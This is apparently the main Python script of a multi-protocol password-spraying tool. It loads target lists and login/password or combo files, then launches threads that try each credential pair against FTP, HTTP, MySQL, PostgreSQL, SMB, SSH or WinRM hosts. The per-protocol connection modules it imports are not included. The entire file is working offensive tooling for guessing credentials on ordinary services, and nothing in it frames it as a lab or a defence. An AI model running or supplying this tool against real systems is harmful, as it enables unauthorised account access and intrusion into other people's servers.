import sys
import protocol_ftp
import protocol_http
import protocol_mysql
import protocol_postgresql
import protocol_smb
import protocol_ssh
import protocol_winrm
from time import sleep
from queue import Queue
from threading import Thread
from optparse import OptionParser
from colorama import init, Fore

init(autoreset=True)


def q_ftp(q_hosts, log, pas):
    while True:
        host = q_hosts.get()
        for i in range(len(log)):
            s = protocol_ftp.con_ftp(host=host, user=log[i], secret=pas[i])
        q_hosts.task_done()


def q_http(q_hosts, log, pas):
    while True:
        host = q_hosts.get()
        for i in range(len(log)):
            s = protocol_http.con_http(host=host, user=log[i], secret=pas[i])
        q_hosts.task_done()


def q_mysql(q_hosts, log, pas, q_dbname):
    while True:
        host = q_hosts.get()
        dbname = q_dbname.get()
        for i in range(len(log)):
            s = protocol_mysql.con_msql(host=host, user=log[i], secret=pas[i], datab_name=dbname)
        q_hosts.task_done()


def q_postgresql(q_hosts, log, pas, q_dbname):
    while True:
        host = q_hosts.get()
        dbname = q_dbname.get()
        for i in range(len(log)):
            s = protocol_postgresql.con_psgrsql(host=host, user=log[i], secret=pas[i], datab_name=dbname)
        q_hosts.task_done()


def q_smb(q_hosts, log, pas):
    while True:
        host = q_hosts.get()
        for i in range(len(log)):
            s = protocol_smb.con_smb(name_server=host, user=log[i], secret=pas[i])
        q_hosts.task_done()


def q_ssh(q_hosts, log, pas):
    while True:
        host = q_hosts.get()
        for i in range(len(log)):
            s = protocol_ssh.con_ssh(host=host, user=log[i], secret=pas[i])
        q_hosts.task_done()


def q_winrm(q_hosts, log, pas):
    while True:
        host = q_hosts.get()
        for i in range(len(log)):
            s = protocol_winrm.con_winrm(host=host, user=log[i], secret=pas[i])
        q_hosts.task_done()


class PasswordSpraying:
    def __init__(self):
        self.info = "Simple password spraying"
        self.protocol = 0
        self.target = []
        self.dbname = []
        self.log = []
        self.pas = []
        self.file_target = None
        self.file_log = None
        self.file_pas = None
        self.singleMode = False
        self.attempts = 0

    def startup(self):
        print(self.info)

        usage = '{} [-p protocol] [-i singleTarget] [-up singleLogPas]'.format(sys.argv[0])

        option = OptionParser(version=self.info, usage=usage)

        option.add_option('-p', dest='protocol',
                          help='choose your protocol')
        option.add_option('-i', type=str, dest='singleTarget',
                          help='ip address or url to attack')
        option.add_option('-I', dest='targetFile',
                          help='type path to file with ip or url to attack')
        option.add_option('-l', type=str, dest='singlelogin',
                          help='single possible user')
        option.add_option('-s', type=str, dest='singlepas',
                          help='single possible password')
        option.add_option('-L', dest='filelogin',
                          help='file with logins')
        option.add_option('-S', dest='filepas',
                          help='file witn passwords')
        option.add_option('-C', dest='combofile',
                          help='file with login and passwords')
        option.add_option('-N', dest='dbname',
                          help='name of database for mysql and postgresql')
        option.add_option('-a', dest='attmpts',
                          help='number of attempts')

        (options, args) = option.parse_args()

        if not options.protocol and not options.singleTarget and not options.targetFile:
            print(Fore.RED + '-> you should set protocol and ips!')
            option.print_help()
            sys.exit(1)
        else:
            if ((options.singlelogin and options.singlepas) and not (options.filelogin and options.filepas) and (
                    not options.combofile)) or not (
                    (options.singlelogin and options.singlepas) and (options.filelogin and options.filepas) and (
                    not options.combofile)) or not (
                    (options.singlelogin and options.singlepas) and not (options.filelogin and options.filepas) and (
                    options.combofile)):
                if options.singleTarget and not options.targetFile:
                    self.singleMode = True
                    self.func_target(options)
                elif not options.singleTarget and options.targetFile:
                    self.singleMode = False
                    self.func_target(options)
                else:
                    print(Fore.RED + '-> you should set mode of program: single or several targets!')
                    option.print_help()
                    sys.exit(1)
            else:
                print(Fore.RED + '-> you should type pair of possible user and password or path to this file')
                sys.exit(1)

    def func_target(self, options):
        self.protocol = options.protocol
        if self.singleMode:
            self.target.append(str(options.singleTarget))
            if options.dbname:
                self.dbname.append(str(options.dbname))
        elif not self.singleMode:
            path_target = options.targetFile
            with open(path_target, mode='r') as f:
                for target_line in f:
                    if str(options.protocol) == "mysql" or str(options.protocol) == "postgresql":
                        target_line = target_line.rstrip('\n')
                        target_line_split = target_line.split()
                        self.target.append(target_line_split[0])
                        self.dbname.append(target_line_split[1])
                    else:
                        target_line = target_line.rstrip('\n')
                        self.target.append(target_line)
        else:
            print(Fore.RED + '-> Check targets flags')
            sys.exit(1)

        if options.singlelogin and options.singlepas:
            self.log.append(str(options.singlelogin))
            self.pas.append(str(options.singlepas))
            self.pas_spray()
        elif options.filelogin and options.filepas:
            path_log = str(options.filelogin)
            path_pas = str(options.filepas)
            with open(path_log, mode='r') as f:
                for log_line in f:
                    log_line = log_line.rstrip('\n')
                    self.log.append(log_line)
            with open(path_pas, mode='r') as f:
                for pas_line in f:
                    pas_line = pas_line.rstrip('\n')
                    self.pas.append(pas_line)
            self.pas_spray()
        elif options.combofile:
            path = str(options.combofile)
            with open(path, mode='r') as f:
                for line in f:
                    line = line.rstrip('\n')
                    splt_line = line.split()
                    self.log.append(splt_line[0])
                    self.pas.append(splt_line[1])
            self.pas_spray()
        else:
            print(Fore.RED + '-> Check login and passwords flags')
            sys.exit(1)

    def pas_spray(self):

        q_hosts = Queue()

        for x in self.target:
            q_hosts.put(x)

        targets_num = int(len(self.target))

        match self.protocol:
            case 'ftp':
                for x in range(1, targets_num + 1):
                    Thread(target=q_ftp, args=(q_hosts, self.log, self.pas)).start()
                    sleep(5)
            case 'http':
                for x in range(1, targets_num + 1):
                    Thread(target=q_http, args=(q_hosts, self.log, self.pas)).start()
                    sleep(5)
            case 'mysql':
                q_dbnames = Queue()
                for y in self.dbname:
                    q_dbnames.put(y)
                for x in range(1, targets_num + 1):
                    Thread(target=q_mysql, args=(q_hosts, self.log, self.pas, q_dbnames)).start()
                    sleep(5)
            case 'postgresql':
                q_dbnames = Queue()
                for y in self.dbname:
                    q_dbnames.put(y)
                for x in range(1, targets_num + 1):
                    Thread(target=q_postgresql, args=(q_hosts, self.log, self.pas, q_dbnames)).start()
                    sleep(5)
            case 'smb':
                for x in range(1, targets_num + 1):
                    Thread(target=q_smb, args=(q_hosts, self.log, self.pas)).start()
                    sleep(5)
            case 'ssh':
                for x in range(1, targets_num + 1):
                    Thread(target=q_ssh, args=(q_hosts, self.log, self.pas)).start()
                    sleep(5)
            case 'winrm':
                for x in range(1, targets_num + 1):
                    Thread(target=q_winrm, args=(q_hosts, self.log, self.pas)).start()
                    sleep(5)


if __name__ == '__main__':
    ps = PasswordSpraying()
    ps.startup()
    print("END OF PROGRAM")
    sys.exit()
